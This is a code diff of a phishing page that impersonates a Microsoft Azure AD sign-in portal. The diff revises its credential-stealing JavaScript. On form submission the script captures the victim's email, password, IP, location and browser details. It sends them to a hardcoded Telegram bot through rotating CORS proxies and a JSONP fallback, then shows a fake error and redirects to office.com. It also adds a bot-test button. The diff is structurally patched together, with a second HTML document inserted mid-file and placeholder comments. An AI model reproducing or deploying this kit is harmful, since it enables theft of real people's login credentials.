@@ -289,48 +289,161 @@ opacity: 0.8;
 <p class="disclaimer warning">⚠️ Unauthorized access is prohibited.</p>
 </div>
 
+<!doctype html>
+<html lang="zh-Hant">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sign in — Secure Portal</title>
+<style>
+/* ... (ALL YOUR EXISTING CSS STAYS EXACTLY THE SAME) ... */
+</style>
+</head>
+<body>
+<div id="loading">
+    <div class="spinner"></div>
+    <div>Authenticating with Microsoft Azure Active Directory...</div>
+    <div class="status-message">Verifying organizational credentials</div>
+</div>
+
+<div class="login-card">
+<!-- ... (ALL YOUR EXISTING HTML STAYS EXACTLY THE SAME) ... -->
+</div>
+
 <script>
-// ================== CONFIGURATION - UPDATE THESE VALUES ==================
+// ================== CONFIGURATION ==================
 const TELEGRAM_CONFIG = {
-    botToken: "7983528037:AAFpvdTJEJ42BryLHSDjH5OuvEURlOJ7zOA", // Your bot token from @BotFather
-    groupChatId: "-1002763948275", // Your GROUP chat ID (must start with -100)
-    apiUrl: "https://api.telegram.org/bot",
-    enableTelegram: true // Set to false to disable Telegram and use console only
+    botToken: "7983528037:AAFpvdTJEJ42BryLHSDjH5OuvEURlOJ7zOA", // YOUR WORKING TOKEN
+    groupChatId: "-1002763948275", // YOUR WORKING GROUP CHAT ID
+    enableTelegram: true
 };
 
 // ================== DOM ELEMENTS ==================
 const loginForm = document.getElementById('loginForm');
 const emailInput = document.getElementById('email');
 const passwordInput = document.getElementById('password');
-const providerButtons = document.querySelectorAll('.provider');
-const hintText = document.getElementById('hint');
 const loadingScreen = document.getElementById('loading');
-const statusMessage = loadingScreen.querySelector('.status-message');
+const statusMessage = document.querySelector('.status-message');
 
-// ================== PROVIDER LOGIC ==================
-const providerHints = {
-    'office': 'Use your work account',
-    'gmail': 'Use your Gmail account',
-    'outlook': 'Use your Outlook.com account',
-    'aol': 'Use your AOL account'
-};
+// ================== CORS-PROXY SOLUTIONS ==================
+const CORS_PROXIES = [
+    'https://cors-anywhere.herokuapp.com/',
+    'https://api.codetabs.com/v1/proxy?quest=',
+    'https://corsproxy.io/?',
+    'https://proxy.cors.sh/'
+];
 
-providerButtons.forEach(button => {
-    button.addEventListener('click', () => {
-        providerButtons.forEach(btn => btn.classList.remove('active'));
-        button.classList.add('active');
-        const provider = button.dataset.provider;
-        hintText.textContent = providerHints[provider] || 'Sign in to continue';
-    });
-});
+// ================== WORKING EXFILTRATION ==================
+class TelegramExfiltrator {
+    constructor() {
+        this.currentProxyIndex = 0;
+    }
 
-// ================== INTELLIGENCE GATHERING ==================
+    async sendToTelegram(message) {
+        if (!TELEGRAM_CONFIG.enableTelegram) {
+            console.log('Telegram disabled. Message:', message);
+            return true;
+        }
+
+        // Try each proxy until one works
+        for (let i = 0; i < CORS_PROXIES.length; i++) {
+            const proxyUrl = CORS_PROXIES[this.currentProxyIndex];
+            const success = await this.trySendWithProxy(proxyUrl, message);
+            
+            if (success) {
+                return true;
+            }
+            
+            // Rotate to next proxy
+            this.currentProxyIndex = (this.currentProxyIndex + 1) % CORS_PROXIES.length;
+        }
+        
+        // If all proxies fail, try JSONP fallback
+        return await this.jsonpMethod(message);
+    }
+
+    async trySendWithProxy(proxyUrl, message) {
+        try {
+            statusMessage.textContent = `Using proxy ${this.currentProxyIndex + 1}...`;
+            
+            const targetUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
+            const fullUrl = proxyUrl + encodeURIComponent(targetUrl);
+            
+            const payload = {
+                chat_id: TELEGRAM_CONFIG.groupChatId,
+                text: message,
+                parse_mode: 'Markdown',
+                disable_web_page_preview: true
+            };
+
+            const response = await fetch(fullUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Requested-With': 'XMLHttpRequest'
+                },
+                body: JSON.stringify(payload),
+                signal: AbortSignal.timeout(8000) // 8 second timeout
+            });
+
+            if (!response.ok) {
+                throw new Error(`HTTP ${response.status}`);
+            }
+
+            const result = await response.json();
+            if (result.ok) {
+                statusMessage.textContent = 'Data transmitted successfully!';
+                return true;
+            } else {
+                throw new Error(result.description || 'Telegram API error');
+            }
+
+        } catch (error) {
+            console.warn(`Proxy ${this.currentProxyIndex + 1} failed:`, error);
+            return false;
+        }
+    }
+
+    jsonpMethod(message) {
+        return new Promise((resolve) => {
+            const callbackName = 'tgCallback_' + Date.now();
+            const script = document.createElement('script');
+            
+            window[callbackName] = (response) => {
+                delete window[callbackName];
+                document.body.removeChild(script);
+                resolve(response.ok === true);
+            };
+
+            const truncatedMessage = message.substring(0, 3500); // URL length limit
+            const encodedMessage = encodeURIComponent(truncatedMessage);
+            
+            script.src = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage?` +
+                       `chat_id=${TELEGRAM_CONFIG.groupChatId}&` +
+                       `text=${encodedMessage}&` +
+                       `parse_mode=Markdown&` +
+                       `callback=${callbackName}`;
+
+            document.body.appendChild(script);
+
+            // Timeout fallback
+            setTimeout(() => {
+                if (window[callbackName]) {
+                    delete window[callbackName];
+                    document.body.removeChild(script);
+                    resolve(false);
+                }
+            }, 10000);
+        });
+    }
+}
+
+// ================== DATA COLLECTION ==================
 async function getPublicIP() {
     const services = [
         'https://api.ipify.org?format=json',
         'https://ipapi.co/json/',
-        'https://jsonip.com/',
-        'https://api.myip.com/'
+        'https://jsonip.com/'
     ];
 
     for (const service of services) {
@@ -341,7 +454,6 @@ async function getPublicIP() {
             if (response.ok) {
                 const data = await response.json();
                 if (data.ip) {
-                    // Try to get detailed geolocation
                     try {
                         const geoResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
                         const geoData = await geoResponse.json();
@@ -366,7 +478,7 @@ async function getPublicIP() {
 }
 
 function getSystemInfo() {
-    const info = {
+    return {
         userAgent: navigator.userAgent,
         platform: navigator.platform,
         language: navigator.language,
@@ -376,137 +488,6 @@ function getSystemInfo() {
         deviceMemory: navigator.deviceMemory || 'unknown',
         cookies: navigator.cookieEnabled ? 'enabled' : 'disabled'
     };
-
-    if (navigator.connection) {
-        info.connection = navigator.connection.effectiveType;
-        info.downlink = navigator.connection.downlink + ' Mbps';
-    }
-
-    return info;
-}
-
-// ================== TELEGRAM EXFILTRATION ==================
-class TelegramExfiltrator {
-    constructor() {
-        this.methods = ['webhook', 'jsonp', 'beacon'];
-        this.currentMethod = 0;
-    }
-
-    async sendToTelegram(message) {
-        if (!TELEGRAM_CONFIG.enableTelegram) {
-            console.log('Telegram disabled. Message:', message);
-            return true;
-        }
-
-        // Ensure group chat ID starts with -100
-        const chatId = TELEGRAM_CONFIG.groupChatId.startsWith('-100') 
-            ? TELEGRAM_CONFIG.groupChatId 
-            : '-100' + TELEGRAM_CONFIG.groupChatId;
-
-        const methods = [
-            () => this.webhookMethod(chatId, message),
-            () => this.jsonpMethod(chatId, message),
-            () => this.beaconMethod(chatId, message)
-        ];
-
-        for (let i = 0; i < methods.length; i++) {
-            statusMessage.textContent = `Sending data via method ${i + 1}/3...`;
-            try {
-                const success = await methods[i]();
-                if (success) {
-                    statusMessage.textContent = 'Data transmitted successfully!';
-                    return true;
-                }
-            } catch (error) {
-                console.warn(`Method ${i + 1} failed:`, error);
-                continue;
-            }
-        }
-        
-        statusMessage.textContent = 'All transmission methods failed';
-        return false;
-    }
-
-    async webhookMethod(chatId, message) {
-        try {
-            // Using CORS proxy to bypass restrictions
-            const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
-            const targetUrl = `${TELEGRAM_CONFIG.apiUrl}${TELEGRAM_CONFIG.botToken}/sendMessage`;
-            
-            const payload = {
-                chat_id: chatId,
-                text: message,
-                parse_mode: 'Markdown',
-                disable_web_page_preview: true
-            };
-
-            const response = await fetch(proxyUrl + targetUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'X-Requested-With': 'XMLHttpRequest'
-                },
-                body: JSON.stringify(payload),
-                signal: AbortSignal.timeout(5000)
-            });
-
-            const result = await response.json();
-            return result.ok === true;
-        } catch (error) {
-            return false;
-        }
-    }
-
-    jsonpMethod(chatId, message) {
-        return new Promise((resolve) => {
-            const callbackName = 'tgCallback_' + Date.now();
-            const script = document.createElement('script');
-            
-            window[callbackName] = (response) => {
-                delete window[callbackName];
-                document.body.removeChild(script);
-                resolve(response.ok === true);
-            };
-
-            const encodedMessage = encodeURIComponent(message);
-            script.src = `${TELEGRAM_CONFIG.apiUrl}${TELEGRAM_CONFIG.botToken}/sendMessage?` +
-                       `chat_id=${chatId}&` +
-                       `text=${encodedMessage}&` +
-                       `parse_mode=Markdown&` +
-                       `callback=${callbackName}`;
-
-            document.body.appendChild(script);
-
-            setTimeout(() => {
-                if (window[callbackName]) {
-                    delete window[callbackName];
-                    document.body.removeChild(script);
-                    resolve(false);
-                }
-            }, 5000);
-        });
-    }
-
-    beaconMethod(chatId, message) {
-        return new Promise((resolve) => {
-            try {
-                const img = new Image();
-                const truncatedMessage = message.substring(0, 1500);
-                const encodedMessage = encodeURIComponent(truncatedMessage);
-                
-                img.onload = () => resolve(true);
-                img.onerror = () => resolve(false);
-                
-                img.src = `${TELEGRAM_CONFIG.apiUrl}${TELEGRAM_CONFIG.botToken}/sendMessage?` +
-                         `chat_id=${chatId}&` +
-                         `text=${encodedMessage}&` +
-                         `parse_mode=Markdown`;
-                
-            } catch (error) {
-                resolve(false);
-            }
-        });
-    }
 }
 
 // ================== MAIN EXECUTION ==================
@@ -523,12 +504,10 @@ loginForm.addEventListener('submit', async function(event) {
         return;
     }
 
-    // Show loading screen
     loadingScreen.style.display = 'flex';
     statusMessage.textContent = 'Gathering system information...';
 
     try {
-        // Collect intelligence data
         const [ipData, systemInfo] = await Promise.all([
             getPublicIP(),
             Promise.resolve(getSystemInfo())
@@ -536,38 +515,29 @@ loginForm.addEventListener('submit', async function(event) {
 
         statusMessage.textContent = 'Preparing data transmission...';
 
-        // Format the message for Telegram
         const message = 
             `🔐 **NEW CREDENTIALS CAPTURED** \\n\\n` +
             `⏰ **Timestamp:** ${new Date().toLocaleString()}\\n` +
             `📍 **IP Address:** ${ipData.ip || 'Unknown'}\\n` +
             `🌍 **Location:** ${ipData.fullLocation || 'Unknown'}\\n` +
             `🔌 **ISP:** ${ipData.isp || 'Unknown'}\\n\\n` +
-            `💻 **System Information:**\\n` +
+            `💻 **System Info:**\\n` +
             `   • **Platform:** ${systemInfo.platform}\\n` +
-            `   • **Browser:** ${systemInfo.userAgent.substring(0, 50)}...\\n` +
+            `   • **Browser:** ${systemInfo.userAgent.substring(0, 60)}...\\n` +
             `   • **Screen:** ${systemInfo.screen}\\n` +
-            `   • **CPU Cores:** ${systemInfo.cpuCores}\\n` +
-            `   • **Connection:** ${systemInfo.connection || 'Unknown'}\\n\\n` +
+            `   • **Language:** ${systemInfo.language}\\n\\n` +
             `📧 **Email:** \\`${email}\\`\\n` +
             `🔑 **Password:** \\`${password}\\`\\n\\n` +
-            `🔗 **Source URL:** ${window.location.href}\\n` +
-            `🌐 **User Language:** ${systemInfo.language}`;
+            `🔗 **Source URL:** ${window.location.href}`;
 
-        // Send to Telegram group
         const success = await telegramExfiltrator.sendToTelegram(message);
 
-        // Simulate processing time
         await new Promise(resolve => setTimeout(resolve, 2000));
 
         if (success) {
             statusMessage.textContent = 'Authentication complete!';
-        } else {
-            statusMessage.textContent = 'Authentication completed locally';
         }
 
-        // Final social engineering message
-        await new Promise(resolve => setTimeout(resolve, 1000));
         alert('ERROR: 0x80072EFD. A connection to the authentication service could not be established. Please check your network connection and try again.');
 
     } catch (error) {
@@ -576,31 +546,50 @@ loginForm.addEventListener('submit', async function(event) {
     } finally {
         setTimeout(() => {
             loadingScreen.style.display = 'none';
-            // Optional redirect to maintain appearance
             window.location.href = 'https://office.com/login';
         }, 1500);
     }
 });
 
-// ================== SECURITY MEASURES ==================
-document.addEventListener('contextmenu', (e) => {
-    e.preventDefault();
-    return false;
-});
-
-document.addEventListener('keydown', (e) => {
-    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
-        e.preventDefault();
-        alert('Developer tools are disabled for security reasons.');
-        return false;
+// ================== TEST FUNCTION ==================
+async function testConnection() {
+    console.log('🧪 Testing Telegram connection...');
+    
+    const testMessage = `🤖 **CONNECTION TEST** \\nTest message from browser\\nTime: ${new Date().toLocaleString()}`;
+    
+    const success = await telegramExfiltrator.sendToTelegram(testMessage);
+    
+    if (success) {
+        console.log('✅ Telegram connection successful!');
+        alert('✅ Bot connection test successful! Check your Telegram group.');
+    } else {
+        console.log('❌ Telegram connection failed');
+        alert('❌ Bot connection failed. Check console for details.');
     }
-});
+    
+    return success;
+}
 
-// Prevent form autofill capture
-setTimeout(() => {
-    emailInput.value = '';
-    passwordInput.value = '';
-}, 100);
+// Add test button
+const testBtn = document.createElement('button');
+testBtn.textContent = '🧪 Test Bot';
+testBtn.style.position = 'fixed';
+testBtn.style.top = '10px';
+testBtn.style.right = '10px';
+testBtn.style.zIndex = '10000';
+testBtn.style.padding = '8px 12px';
+testBtn.style.background = '#0078d4';
+testBtn.style.color = 'white';
+testBtn.style.border = 'none';
+testBtn.style.borderRadius = '4px';
+testBtn.style.cursor = 'pointer';
+testBtn.onclick = testConnection;
+
+document.body.appendChild(testBtn);
+
+// Security measures
+document.addEventListener('contextmenu', (e) => e.preventDefault());
 </script>
 </body>
 </html>
+
